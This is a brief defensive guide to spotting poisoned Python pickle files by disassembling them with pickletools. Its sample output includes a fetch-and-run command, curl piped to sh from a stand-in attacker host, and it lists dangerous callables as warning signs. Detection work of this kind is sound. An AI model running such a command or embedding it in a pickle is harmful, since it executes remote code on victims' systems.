DETECTING POISONED Pickles

If you have '.pkl or .pickle' files and you need to analyze or detect malicious intent - you can;
 
1  . Static Analysis of the Pickle File
= use Python's built-in pickletools to disassemble the pickle bytecode:

{ bash
    python -m pickletools malicious_task.pickle
}
It outputs a human-readable version like:

GLOBAL 'os system'
STRING 'curl http://attacker.com/malware.sh | sh'
TUPLE 
REDUCE
STOP

BEWARE - If you see: 
- os.system, subprocess, eval, exec, __import__, etc.
- REDUCE or GLOBAL opcodes with suspicious callables

-> The pickle is likely malicious.